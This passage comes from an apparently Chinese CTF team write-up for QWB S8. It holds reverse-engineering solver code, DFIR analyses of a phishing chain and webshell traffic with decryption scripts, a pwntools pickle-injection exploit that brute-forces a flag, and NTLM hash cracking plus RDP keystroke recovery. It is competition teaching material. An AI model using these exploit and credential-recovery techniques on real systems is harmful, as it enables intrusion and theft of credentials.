        if (x == current_goal_x && y == current_goal_y) {
            if (true) {
                if (computeCodeMD5(path) == "9c06c08f882d7981e91d663364ce5e2e") {
                    printf("Congratulations! You found the key!\n");
                    printf("goal_index: %d, key: %d\n", goal_index, key);
                    printf("The path to the key is:\n");
                    for (auto p : path) {
                        printf("%u, ", p);
                    }
                    printf("\n");
                    return;
                }
            } 
            goal_index += 1;
            current_goal_x = goals[goal_index][0];
            current_goal_y = goals[goal_index][1];
            arrived = true;
            while (current_goal_x - x == 0 && current_goal_y - y == 0) {
                goal_index += 1;
                current_goal_x = goals[goal_index][0];
                current_goal_y = goals[goal_index][1];
            }
            if (current_goal_x - x == 0) {
                if (current_goal_y > y && dir == 3 || current_goal_y < y && dir == 2)
                    y_reverse_dir = true;
            }
            if (current_goal_y - y == 0) {
                if (current_goal_x > x && dir == 1 || current_goal_x < x && dir == 0)
                    x_reverse_dir = true;
            }
        }
        int delta_x = current_goal_x - x;
        int delta_y = current_goal_y - y;
        if (delta_x > 0 && (dir == 0 || delta_y <= 0 && dir == 2 || delta_y >= 0 && dir == 3) || y_reverse_dir) {
            if (x + 1 < 20) {
                q.push(make_tuple(((x + 1) << 8) | y, goal_index, (key + 30) & 0xff));
                path.push_back(0);
                paths.push(path);
                path.pop_back();
            }
        }
        if (delta_x < 0 && (dir == 1 || delta_y <= 0 && dir == 2 || delta_y >= 0 && dir == 3) || y_reverse_dir) {
            if (x - 1 >= 0) {
                q.push(make_tuple(((x - 1) << 8) | y, 0x01000000 | goal_index, key));
                path.push_back(1);
                paths.push(path);
                path.pop_back();
            }
        }
        if (delta_y > 0 && (dir == 2 || delta_x <= 0 && dir == 0 || delta_x >= 0 && dir == 1) || x_reverse_dir) {
            if (y + 1 < 20) {
                q.push(make_tuple((x << 8) | (y + 1), 0x02000000 | goal_index, ((key << 3) | (key >> 5)) & 0xff));
                path.push_back(2);
                paths.push(path);
                path.pop_back();
            }
        }
        if (delta_y < 0 && (dir == 3 || delta_x <= 0 && dir == 0 || delta_x >= 0 && dir == 1) || x_reverse_dir) {
            if (y - 1 >= 0) {
                q.push(make_tuple((x << 8) | (y - 1), 0x03000000 | goal_index, (key - 102) & 0xff));
                path.push_back(3);
                paths.push(path);
                path.pop_back();
            }
        }
        index += 1;
        if (index % 10000 == 0) {
            // printf("index: %d\n", index);
            printf("dir: %d, goal_index: %d, key: %d\n", dir, goal_index, key);
            // printf("delta_x: %d, delta_y: %d\n", delta_x, delta_y);
            // printf("x_reverse_dir: %d, y_reverse_dir: %d\n", x_reverse_dir, y_reverse_dir);
        }
    }
    printf("%zd", q.size());
}

void bfs2() {
    queue<tuple<unsigned short, unsigned int, unsigned char>> q;
    queue<vector<unsigned char>> paths;

    q.push(make_tuple(0x0a0a, 0x00000000, 0xB4)); // (u, v, w)
    paths.push(vector<unsigned char>());
    int index = 0;

    while (!q.empty()) {
        auto [xy, dir_goal_index, key] = q.front();
        auto path = paths.front();

        unsigned char x = (xy >> 8) & 0xff;
        unsigned char y = xy & 0xff;
        unsigned char dir = dir_goal_index >> 24;
        unsigned int goal_index = dir_goal_index & 0xffffff;
        unsigned char current_goal_x = goals[goal_index][0];
        unsigned char current_goal_y = goals[goal_index][1];
        bool x_reverse_dir = false;
        bool y_reverse_dir = false;
        bool arrived = false;

        q.pop();
        paths.pop();
        if (x == current_goal_x && y == current_goal_y) {
            if (true) {
                if (computeCodeMD5(path) == "9c06c08f882d7981e91d663364ce5e2e") {
                    printf("Congratulations! You found the key!\n");
                    printf("goal_index: %d, key: %d\n", goal_index, key);
                    printf("The path to the key is:\n");
                    for (auto p : path) {
                        printf("%u, ", p);
                    }
                    printf("\n");
                    return;
                }
            } 
            goal_index += 1;
            current_goal_x = goals[goal_index][0];
            current_goal_y = goals[goal_index][1];
            arrived = true;
            while (current_goal_x - x == 0 && current_goal_y - y == 0) {
                goal_index += 1;
                current_goal_x = goals[goal_index][0];
                current_goal_y = goals[goal_index][1];
            }
            if (current_goal_x - x == 0) {
                if (current_goal_y > y && dir == 3 || current_goal_y < y && dir == 2)
                    y_reverse_dir = true;
            }
            if (current_goal_y - y == 0) {
                if (current_goal_x > x && dir == 1 || current_goal_x < x && dir == 0)
                    x_reverse_dir = true;
            }
        }
        int delta_x = current_goal_x - x;
        int delta_y = current_goal_y - y;
        if (delta_x > 0 && (dir == 0 || delta_y <= 0 && dir == 2 || delta_y >= 0 && dir == 3) || y_reverse_dir) {
            if (x + 1 < 20 && y_reverse_dir) {
                q.push(make_tuple(((x + 1) << 8) | y, goal_index, (key + 30) & 0xff));
                path.push_back(0);
                paths.push(path);
                path.pop_back();
            }
            else if (!y_reverse_dir) {
                q.push(make_tuple(((x + delta_x) << 8) | y, goal_index, (key + 30) & 0xff));
                path.push_back(0);
                paths.push(path);
                path.pop_back();
            }
        }
        if (delta_x < 0 && (dir == 1 || delta_y <= 0 && dir == 2 || delta_y >= 0 && dir == 3) || y_reverse_dir) {
            if (x - 1 >= 0 && y_reverse_dir) {
                q.push(make_tuple(((x - 1) << 8) | y, 0x01000000 | goal_index, key));
                path.push_back(1);
                paths.push(path);
                path.pop_back();
            }
            else if (!y_reverse_dir) {
                q.push(make_tuple(((x + delta_x) << 8) | y, 0x01000000 | goal_index, key));
                path.push_back(1);
                paths.push(path);
                path.pop_back();
            }
        }
        if (delta_y > 0 && (dir == 2 || delta_x <= 0 && dir == 0 || delta_x >= 0 && dir == 1) || x_reverse_dir) {
            if (y + 1 < 20 && x_reverse_dir) {
                q.push(make_tuple((x << 8) | (y + 1), 0x02000000 | goal_index, ((key << 3) | (key >> 5)) & 0xff));
                path.push_back(2);
                paths.push(path);
                path.pop_back();
            }
            else if (!x_reverse_dir) {
                q.push(make_tuple((x << 8) | (y + delta_y), 0x02000000 | goal_index, ((key << 3) | (key >> 5)) & 0xff));
                path.push_back(2);
                paths.push(path);
                path.pop_back();
            }
        }
        if (delta_y < 0 && (dir == 3 || delta_x <= 0 && dir == 0 || delta_x >= 0 && dir == 1) || x_reverse_dir) {
            if (y - 1 >= 0 && x_reverse_dir) {
                q.push(make_tuple((x << 8) | (y - 1), 0x03000000 | goal_index, (key - 102) & 0xff));
                path.push_back(3);
                paths.push(path);
                path.pop_back();
            }
            else if (!x_reverse_dir) {
                q.push(make_tuple((x << 8) | (y + delta_y), 0x03000000 | goal_index, (key - 102) & 0xff));
                path.push_back(3);
                paths.push(path);
                path.pop_back();
            }
        }
        index += 1;
        if (index % 10000 == 0) {
            // printf("index: %d\n", index);
            printf("dir: %d, goal_index: %d, key: %d\n", dir, goal_index, key);
            cout << computeCodeMD5(path) << endl;
            printf("The path to the key is:\n");
            for (auto p : path) {
                printf("%u, ", p);
            }
            // printf("delta_x: %d, delta_y: %d\n", delta_x, delta_y);
            // printf("x_reverse_dir: %d, y_reverse_dir: %d\n", x_reverse_dir, y_reverse_dir);
        }
    }
    printf("%zd", q.size());
}

int main() {
    srand(0xDEADBEEF);
    for (int i = 0; i < 10000; i++) {
        goals[i][0] = rand() % 20;
        goals[i][1] = rand() % 20;
    }
    printf("goals: %d, %d\n", goals[0][0], goals[0][1]);
    printf("goals: %d, %d\n", goals[1][0], goals[1][1]);
    printf("goals: %d, %d\n", goals[2][0], goals[2][1]);
    printf("goals: %d, %d\n", goals[3][0], goals[3][1]);
    bfs2();
}
```

再写解密脚本

```python
# code = bytes.fromhex('BDBDBDBDBDBDBDBDBDBDBD384CB0386DEE3FC4B4B4096AF0382C79F634E98938AC7F35D4B4B4386D77F6B6386D78F6B62B18B4B4B43B81818181EF4E384C7DF633D4B4B4B0E8F4B4B4B4B4B0E8F62B27A31D3BF4B4B4B4384AC0B4B0F8043889E3C3CA3BF4B4B4B4384AC0C4B0F80438B367E3163BF4B4B4B4384AC0D4B0F80438B6D3B6A93BF4B4B4B4384AC0E4B0F8043889D8C7333BF4B4B4B4384AC0B42BF4B4B4B4384A50B4384CEDB5D4B4B44CF4D42CF885373BF4B4B4B4384AC0C42BF4B4B4B4384A50C4384CEDB5D4B4B44CF4D42CF885373BF4B4B4B4384AC0D42BF4B4B4B4384A50D4384CEDB5D4B4B44CF4D42CF885373BF4B4B4B4384AC0E42BF4B4B4B4384A50E4384CEDB5D4B4B44CF4D42CF88537B0ECFEB4B4B4B4B4B4B46F144CECFEB4B4B42FC02CECFEB4B4B4CC6CFEB4B4B4B624CC72B4B4B43BF4B4B4B4384AC0B42BF4B4B4B4384A50C44C798537D0D2F45BF4B4B4B4384AE1C44CF90537D06204E3605BF4B4B4B4384AE1C4E47905374CE9F4CCE2E44CE14CF9ED38F84CE8F4F8E4E0A84CC1E360E47904374CD02BF4B4B4B4384A50B42CF885374CE8F64C69F4E4404CD02CE8F43BF4B4B4B4384AC0C42BF4B4B4B4384A50B44C798537D0D2F45BF4B4B4B4384AE1B44CF90537D06204E3605BF4B4B4B4384AE1B4E47905374CE9F4D06264CCE2E44CE14CF9ED38F84CE8F4F8E4E0A84CC1E360E47904374CD02BF4B4B4B4384A50C42CF8853752542F2F2FB0EC00B4B4B4B4B4B4B46F144CEC00B4B4B42FC02CEC00B4B4B4CC6C00B4B4B4B624CC72B4B4B43BF4B4B4B4384AC0D42BF4B4B4B4384A50E44C798537D0D2F45BF4B4B4B4384AE1E44CF90537D06204E3605BF4B4B4B4384AE1E4E47905374CE9F4CCE2E44CE14CF9ED38F84CE8F4F8E4E0A84CC1E360E47904374CD02BF4B4B4B4384A50D42CF885374CE8F64C69F4E4404CD02CE8F43BF4B4B4B4384AC0E42BF4B4B4B4384A50D44C798537D0D2F45BF4B4B4B4384AE1D44CF90537D06204E3605BF4B4B4B4384AE1D4E47905374CE9F4D06264CCE2E44CE14CF9ED38F84CE8F4F8E4E0A84CC1E360E47904374CD02BF4B4B4B4384A50E42CF8853752542F2F2F3BF4B4B4B4384AC0B42BF4B4B4B4384A50D44C7985374CF80437E3D02BF4B4B4B4384A50B42CF885373BF4B4B4B4384AC0C42BF4B4B4B4384A50E44C7985374CF80437E3D02BF4B4B4B4384A50C42CF885373BF4B4B4B4384AC0E42BF4B4B4B4384A50B44C7985374CF80437E3D02BF4B4B4B4384A50E42CF885373BF4B4B4B4384AC0C42BF4B4B4B4384A50D44C7985374CF80437E3D02BF4B4B4B4384A50D42CF88537A0EC42B4B4B43DA0EC52B4B4B4BEA0EC62B4B4B451A0EC6FB4B4B43DA0EC7FB4B4B45BA0EC12B4B4B48DA0EC22B4B4B465A0EC32B4B4B4A7A0ECBFB4B4B44DA0ECCFB4B4B4ACA0ECDFB4B4B4F8A0ECEFB4B4B406A0ECFFB4B4B4E9A0EC8FB4B4B43BA0EC9FB4B4B4A3A0ECAFB4B4B431B0ECF5C4B4B4B4B4B4B46F144CECF5C4B4B42FC02CECF5C4B4B4CC6CF5C4B4B4B568E638CAECF5C4B4B4241BF8043738CA6DF5C4B4B4241B7D8542B4B4B463D0F7F4D3C06FF46F00BBC4384C3FBDBDBDBDBD')

v17 = [0] * 16
v17[0] = -104
v17[1] = -96
v17[2] = -39
v17[3] = -104
v17[4] = -70
v17[5] = -105
v17[6] = 27
v17[7] = 113
v17[8] = -101
v17[9] = -127
v17[10] = 68
v17[11] = 47
v17[12] = 85
v17[13] = -72
v17[14] = 55
v17[15] = -33
v17 = bytes([(i) & 0xff for i in v17])

from ctypes import * 
def encrypt(v,k):
    v0=c_uint32(v[0])
    v1=c_uint32(v[1])
    sum1=c_uint32(0)
    delta=0x9e3779b9
    for i in range(32):
        v0.value+=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])
        sum1.value+=delta
        v1.value+=(((v0.value<<4)^(v0.value>>5))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])
    return v0.value,v1.value
 
def decrypt(v,k,round=32):
    v0=c_uint32(v[0])
    v1=c_uint32(v[1])
    delta=0x9e3779b9
    sum1=c_uint32(delta*round)
    for i in range(32):
        v1.value-=(((v0.value<<4)^(v0.value>>5))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])
        sum1.value-=delta
        v0.value-=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])
    return v0.value,v1.value

key = b"W31c0m3. 2 QWBs8"
key = [int.from_bytes(key[i:i+4],'little') for i in range(0,len(key),4)]
v = [int.from_bytes(v17[i:i+4],'little') for i in range(0,len(v17),4)]
v[2] ^= v[1]
v[3] ^= v[0]
v[1] ^= v[3]
v[0] ^= v[2]

plaintext = decrypt(v[:2],key) + decrypt(v[2:],key, 64)
print(b''.join([i.to_bytes(4,'little') for i in plaintext]))
```

## Misc

### givemesecret

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_7.png)

### Master of DFIR - Phishing

钓鱼邮件解出一个加密压缩包和压缩包密码：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_8.png)

可以看到攻击者邮箱：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_9.png)

通过压缩包解密可以得到伪装的 msc 文件，查看 msc 文件内容可以看到执行语句在 97 行：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_10.png)

通过攻击载核可以看到当前执行 VBScript 代码：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_11.png)

通过对 VBScript 解混淆可以看到在 selectnodes 函数的参数如下：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_12.png)

通过 ASCII 转换可以知道存放位置为 `/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU']`

通过查询可知加载恶意 ddl 的 MITRE ATT&CK ID 为 T1574：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_13.png)

明显 `curl_easy_init` 函数被修改了：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_14.png)

解密下一阶段载荷的 key 在函数 `sub_10001240` 中：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_15.png)

将对应地址的数据 dump 下来后用以下脚本可以解密：

```Python
data = list(open("data", "rb").read())
key = bytes.fromhex("f21a9d8b1e5d")

box = list(range(48))
v2 = len(key)
v3 = len(box)
v35 = v3
v19 = v3 - 1
v39 = 0
v36 = v3 - 1
if (v3 - 1 >= 0):
    v20 = v35
    v33 = 17 * v19
    while v19 >= 0:
        v21 = box[v19]
        v22 = v33 + key[v19 % v2] + v21
        v33 -= 17
        v39 = (v39 + v22) % v20
        box[v36] = box[v39]
        v19 = v36 - 1
        v36 = v19
        box[v39] = v21

v23 = len(data)
v24 = 0
v25 = 0
v40 = 0
if (len(data) > 0):
    v26 = box
    while v25 < len(data):
        v38 = (v24 + 1) % v3
        v27 = v26[v38]
        v40 = (v40 + v27 + v25) % v3
        box[v38] = box[v40]
        box[v40] = v27
        v3 = v35
        v26 = box
        data[v25] ^= box[(v27 + box[v38]) % v35]
        v24 = v38
        if not v25 % 5:
            box[(v25 + v38) % v35] ^= v40
        v23 = len(data)
        v25 += 1
open("dec", "wb").write(bytes(data))
```

这段载荷主要是远程下载一个 donut 生成的木马，在流量中可以看到：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_16.png)

下一阶段载荷的回连地址直接可以看到：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_17.png)

最终阶段载荷是使用 donut 生成的，将其从流量包中 dump 下来后使用 https://github.com/volexity/donut-decryptor 可以进行解密，进行反编译可以看到：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_18.png)

这里找到 decrypt key 为 ``pJB`-v)t^ZAsP$|r`` 根据其长度猜测加密算法为 AES。

同时在字符串信息中可以发现：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_19.png)

使用的是 OrcaC2。

```bash
❯ nc 47.104.146.247 9999

  _____  _     _     _     _
 |  __ \| |   (_)   | |   (_)
 | |__) | |__  _ ___| |__  _ _ __   __ _
 |  ___/| '_ \| / __| '_ \| | '_ \ / _` |
 | |    | | | | \__ \ | | | | | | | (_| |
 |_|    |_| |_|_|___/_| |_|_|_| |_|\__, |
                                    __/ |
                                   |___/

欢迎来到Master of DFIR - 🎣 ,我们需要帮助你调查以下任务.并且提交这些任务的正确答案,我们将会给你flag🤔
需要输入Team Token即可开始
Team token > icqae6fbaade616aab87a7d87764ae96
(1/13) 攻击者的邮箱是什么? (注意:MD5(攻击者邮箱),以cyberchef的为准) 示例:9b04d152845ec0a378394003c96da594
请输入你的答案 > a8cd5b4ba47e185d4a69a583fde84da5
正确✅!
(2/13) 攻击者所投放文件的密码是什么? 示例:000nb
请输入你的答案 > 2024qwbs8
正确✅!
(3/13) 攻击者所使用的攻击载荷后缀是什么？ 示例:lnk
请输入你的答案 > msc
正确✅!
(4/13) 攻击者所投放样本的初始执行语句在该攻击载荷文件的第几行? 示例:20
请输入你的答案 > 97
正确✅!
(5/13) 经过初始执行后,攻击者所加载的第二部分载荷所使用的语言是什么? 示例:javascript
请输入你的答案 > VBScript
正确✅!
(6/13) 攻击者所进行的第二部分载荷其将白EXE存在了什么地方? (注意:需要提供完成的解混淆后的第二部分载荷s*******s函数的参数) 提交需要MD5(参数内容) 以Cyberchef结果为准 示例:9b04d152845ec0a378394003c96da594
请输入你的答案 > 69b23cfd967d07c39d1517e2a3c37e34
正确✅!
(7/13) 攻击者使用的这个白EXE加载黑DLL的手法所对应的MITRE ATT&CK ID是什么? (注意:请注意示例的提示提交大类即可不需要细化到分项) 示例: T1000
请输入你的答案 > T1574
正确✅!
(8/13) 攻击者所使用的黑DLL劫持了原始DLL的哪个函数? 示例: main
请输入你的答案 > curl_easy_init
正确✅!
(9/13) 攻击者所使用的黑DLL解密下一阶段载荷所使用的Key是什么? (注意:请提交一段小写的十六进制字符串) 示例:1122334455
请输入你的答案 > f21a9d8b1e5d
正确✅!
(10/13) 攻击者所使用的下一阶段载荷的回连C2是什么? (注意:需要提供ip地址:端口的形式) 示例:127.0.0.1:5100
请输入你的答案 > 192.168.57.119:6000
正确✅!
(11/13) 攻击者所使用最终阶段载荷所使用的加密算法是什么? 示例:DES
请输入你的答案 > AES
正确✅!
(12/13) 攻击者所使用最终阶段载荷所使用的密钥的MD5是什么? (注意:MD5(密钥内容),以cyberchef的为准) 示例:9b04d152845ec0a378394003c96da594
请输入你的答案 > a524c43df3063c33cfd72e2bf1fd32f6
正确✅!
(13/13) 攻击者使用了什么家族的C2? 示例:PoshC2
请输入你的答案 > OrcaC2
正确✅!
恭喜你完成了所有任务,这是你的flag 🚩 -->  flag{a01424afbd980ef65d4e0f1a7fe317bc}
```

### Master of DFIR - Coffee

根据上一题可知在下载木马后会通过 WebSocket 传输使用 AES 加密的数据，可以看到 SystemId：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_20.png)

对加密数据解密可以看到主机名称：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_21.png)

以及下载文件的保存名称：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_22.png)

攻击者上传的文件名：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_23.png)

tomcat 的用户名和密码：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_24.png)

上传的 war 包中主要包含一个 jsp，目的是加载一段字节码，该字节码中包含几个 class，主要逻辑在第二个 class 中，用于加解密的密钥：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_25.png)

接下来可以对流量进行解密，使用如下 Cyberchef 规则即可：

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'2ca9b43c1b8ef8c8'%7D,'Standard',false)AES_Decrypt(%7B'option':'UTF8','string':'b42e327feb5d923b'%7D,%7B'option':'Hex','string':''%7D,'ECB/NoPadding','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Zlib_Inflate(0,0,'Adaptive',false,false)

从流量中可以下载到一个 SQLite 数据库文件：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_26.png)

可以在其中找到浩瀚云云存储管理员账户和密码哈希，通过 cmd5 查询可以得到密码：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_27.png)

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_28.png)

在一段恶意字节码中可以找到运行了一个恶意 powershell 脚本，其中设置了计划任务：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_29.png)

在后续流量中找到了相关挖矿程序的配置文件，获取到了其回连的矿池域名：

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_30.png)

```bash
❯ nc 47.104.5.208 9999

   _____       __  __
  / ____|     / _|/ _|
 | |     ___ | |_| |_ ___  ___
 | |    / _ \|  _|  _/ _ \/ _ \
 | |___| (_) | | | ||  __/  __/
  \_____\___/|_| |_| \___|\___|


欢迎来到Master of DFIR - ☕ ,我们需要帮助你调查以下任务.并且提交这些任务的正确答案,我们将会给你flag🤔
需要输入Team Token即可开始
Team token > icqae6fbaade616aab87a7d87764ae96
(1/9) 受害者主机名是什么? 示例:DESKTOP-J6QZVBD
请输入你的答案 > DESKTOP-28DGVAU
正确✅!
(2/9) 受害者主机的systemId是多少? 示例:1b0679be72ad976ad5d491ad57a5eec0
请输入你的答案 > 9e4a7e9ebdd51913b5d724be14868e85
正确✅!
(3/9) 攻击者下载的文件的保存名是什么？ 示例:flag.txt
请输入你的答案 > history
正确✅!
(4/9) tomcat的用户名和密码是多少? 示例:admin:admin
请输入你的答案 > tomcat:beautiful
正确✅!
(5/9) 攻击者上传的文件名? 示例:flag.txt
请输入你的答案 > help.war
正确✅!
(6/9) webshell中加密算法的密钥是什么,若有多个,以加密顺序用_连接 示例:keya_keyb
请输入你的答案 > b42e327feb5d923b_82ca9b43c1b8ef8c
正确✅!
(7/9) 被黑客窃取的云存储服务的管理员账户和密码是多少? 示例:admin:admin
请输入你的答案 > hhcloud:vipvip123
正确✅!
(8/9) 恶意脚本设置的计划任务叫什么? 示例: Miner
请输入你的答案 > Update service for Windows Service
正确✅!
(9/9) 该挖矿程序回连的矿池域名是什么? 示例:www.baidu.com
请输入你的答案 > auto.skypool.xyz
正确✅!
恭喜你完成了所有任务,这是你的flag 🚩 -->  flag{28e501e554bf98c7b0bec521e67ad82a}
```

### pickle_jail

传入一个 `0xfe` 长度的 `name`，利用 +1 取余的操作改变序列化之后的 `name` 长度 `0x00`，使得 `name` 的内容被识别为控制符。

之后将 name pop 出来，然后将要爆破的字符串入栈，之后利用 `B` 控制字符，将入栈的 `name_list` 和 `flag` 都拼在一起，最后利用 `flag` 结尾的 `}` 作为控制字符，入栈一个空字典。

最后的栈内容为 `( b'flag{xxx', b'CAlice\x94...flag{....', {} )`

之后利用 `if name in players:` 就可以逐字符爆破 `flag` 。

```python
import pickle
import pickletools
import string
from pwn import *

target='x.x.x.x'
port=xxxx
flag_len=0
for j in range(40,50):
    print(j)
    p = remote(target, port)
    p.recvuntil(b'Play this game to get the flag with these players:')
    name_list=eval(p.recvline()[:-2])
    length= len(b''.join(name_list)) + len(name_list) * 3 + 9 + j
    name = b"0C\x04flagB"+int.to_bytes(length, 4,'little')
    pad_len=0xfe-len(name)-2
    name= b'C'+int.to_bytes(pad_len,1,'little')+pad_len*b'0'+name

    p.sendlineafter(b"So... What's your name?",name)
    p.sendlineafter(b'Enter a random number to win:',b'\x0c')
    p.recvline()
    res=p.recvline()
    p.close()
    print(res)
    if b'b\'flag\' joined this game' in res:
        flag_len=j
        break
pre='flag{'
for i in range(50):
    for j in '0123456789abcdef-':
        p = remote(target, port)
        p.recvuntil(b'Play this game to get the flag with these players:')
        name_list = eval(p.recvline()[:-2])
        length = len(b''.join(name_list)) + len(name_list) * 3 + 9 + flag_len
        lb = int.to_bytes(length, 4, 'little')
        tag=pre+j
        name = b"0C"+int.to_bytes(len(pre)+1,1,'little')+tag.encode()+b"B" + lb
        pad_len = 0xfe - len(name) - 2
        name = b'C' + int.to_bytes(pad_len, 1, 'little') + pad_len * b'0' + name
        p.sendlineafter(b"So... What's your name?", name)
        p.sendlineafter(b'Enter a random number to win:', b'\x0c')
        p.recvline()
        res = p.recvline()
        print(res)
        p.close()
        if b'joined this game' in res:
            pre+=j
            print(pre)
            break
```

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_31.png)

### 谍影重重5.0

根据 SMB2 报文中的信息构造：

```plaintext
tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000
```

通过 john 爆破得到密码 `babygirl233`，使用 https://gist.github.com/khr0x40sh/747de1195bbe19f752e5f02dc22fce01#file-random_session_key_calc-py 生成 Session Key，导入 Session ID 和 Session Key：`0900000000100000:a3abe4d64394909a641062342ffe291b`。

解密流量后得到一个加密的 `flag.7z`，两个证书文件，其中 `pfx` 文件是加密的，爆破得到其密码为 `mimikatz`，从中提取私钥后导入 Wireshark 后可以看到明文的 RDP 报文，提取其中的键盘流量记录：

```Bash
openssl pkcs12 -in LOCAL_MACHINE_Remote\ Desktop_0_DESKTOP-J0EE9MR.pfx -nocerts -out private_key.pem -nodes

tshark -r 谍影重重5.0.pcapng -Y "rdp" -Y "rdp.fastpath.eventheader == 0x00" -T fields -e rdp.fastpath.scancode.keycode > keycode.txt
```

根据映射表进行解码：

```python
keyboard_mapping = {'0x01': 'esc', '0x02': '1', '0x03': '2', '0x04': '3', '0x05': '4', '0x06': '5', '0x07': '6', '0x08': '7', '0x09': '8', '0x0a': '9', '0x0b': '0', '0x0c': '-', '0x0d': '=', '0x0e': 'backspace', '0x0f': 'tab', '0x10': 'q', '0x11': 'w', '0x12': 'e', '0x13': 'r', '0x14': 't', '0x15': 'y', '0x16': 'u', '0x17': 'i', '0x18': 'o', '0x19': 'p', '0x1a': '[', '0x1b': ']', '0x1c': 'enter', '0x1d': 'right ctrl', '0x1e': 'a', '0x1f': 's', '0x20': 'd', '0x21': 'f', '0x22': 'g', '0x23': 'h', '0x24': 'j', '0x25': 'k', '0x26': 'l', '0x27': ';', '0x28': "'", '0x29': '`', '0x2a': 'left shift', '0x2b': '\\', '0x2c': 'z', '0x2d': 'x', '0x2e': 'c', '0x2f': 'v', '0x30': 'b',
                    '0x31': 'n', '0x32': 'm', '0x33': ',', '0x34': '.', '0x35': '/', '0x37': '*(keypad)', '0x36': 'right shift', '0x38': 'right alt', '0x39': 'space', '0x3a': 'caps lock', '0x3b': 'f1', '0x3c': 'f2', '0x3d': 'f3', '0x3e': 'f4', '0x3f': 'f5', '0x40': 'f6', '0x41': 'f7', '0x42': 'f8', '0x43': 'f9', '0x44': 'f10', '0x45': 'num lock', '0x46': 'scroll lock', '0x47': 'home', '0x48': 'up arrow', '0x49': 'pg up', '0x4a': '-(keypad)', '0x4b': 'left arrow', '0x4c': '5(keypad)', '0x4d': 'right arrow', '0x4e': '+(keypad)', '0x4f': 'end', '0x50': 'down arrow', '0x51': 'pg down', '0x52': 'insert', '0x53': 'delete', '0x5b': 'left win', '0x5c': 'right win', '0x5d': 'menu key'}
data = open("keycode.txt", "r").readlines()
for line in data:
    line = line.strip()
    if line in keyboard_mapping:
        print(keyboard_mapping[line], end='')
    else:
        print(line, end='')
# The 7z password is f'{windows_password}9347013182'
```

得到 7z 的密码是 `babygirl2339347013182`，解压后得到 flag：`flag{fa32a0b2-dc26-41f9-a5cc-1a48ca7b2ddd}`

### Master of OSINT

1. 杭州绕城高速

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_32.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_33.png)

2. 长沙橘子洲大桥

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_34.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_35.png)

3. 上海崇明岛

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_36.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_37.png)

4. 青海湖

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_38.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_39.png)

5. 武汉天兴洲长江大桥

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_40.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_41.png)

6. 上海路发广场

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_42.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_43.png)

7. 成都双流国际机场

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_44.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_45.png)

8. 大报恩寺

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_46.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_47.png)

9. 重庆万象城

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_48.png)![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_49.png)

### AbstractMaze

